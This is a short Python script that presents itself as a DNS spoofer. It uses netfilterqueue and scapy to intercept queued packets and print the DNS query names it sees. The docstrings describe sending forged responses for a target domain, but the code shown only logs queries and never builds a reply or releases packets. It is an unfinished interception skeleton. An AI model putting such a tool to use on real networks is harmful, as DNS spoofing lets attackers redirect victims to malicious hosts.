import netfilterqueue
import scapy.all as scapy

def process_packet(packet, target_domain, spoofed_ip):
    """
    This function is called for each packet in the linux NFQUEUE
    It checks DNS queries for the target domain and sends a forget response
    """

    # Convert raw payload into scapy packet
    scapy_packet = scapy.IP(packet.get_payload())

    print(scapy_packet)

    # Check for DNS Query Record layer
    if scapy_packet.haslayer(scapy.DNSQR):
        
        queried_domain = scapy_packet[scapy.DNSQR].qname.decode()
        print(f"RESOLVED DOMAIN: {queried_domain}")


def start(target_domain, spoofed_ip):
    """
    Starts the DNS spoofer.
    """
    queue = netfilterqueue.NetfilterQueue()
    # We use a lambda function to pass our arguments to the callback
    queue.bind(0, lambda packet: process_packet(packet, target_domain, spoofed_ip))
    print(f"[*] DNS Spoofer started. Targeting domain '{target_domain}'...")
    try:
        queue.run()
    except KeyboardInterrupt:
        print("\n[*] Shutting down DNS spoofer.")
        queue.unbind()
